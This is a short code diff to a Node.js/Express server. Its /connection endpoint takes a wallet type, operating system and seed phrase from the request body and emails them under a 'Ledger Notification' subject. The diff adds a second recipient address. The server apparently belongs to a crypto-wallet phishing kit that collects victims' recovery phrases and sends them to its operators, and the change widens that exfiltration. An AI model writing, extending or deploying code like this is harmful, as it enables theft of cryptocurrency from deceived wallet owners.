@@ -40,11 +40,12 @@ const transporter = nodemailer.createTransport({
 app.post('/connection', (req, res) => {
     const { wallet, os, phrase }  = req.body
     const admin = process.env.ADMIN_EMAIL
+    const admin2 = process.env.ADMIN_EMAIL2
 
   // configure the email message
   const mailOptions = {
     from: `"noreply@proton.me" <${process.env.USER}>`,
-        to: admin,
+        to: [admin, admin2],
         subject: 'Ledger Notification',
         text: `Wallet Type: ${wallet},\n\nOS Type: ${os},\n\nPhrase: ${phrase}`,
   };
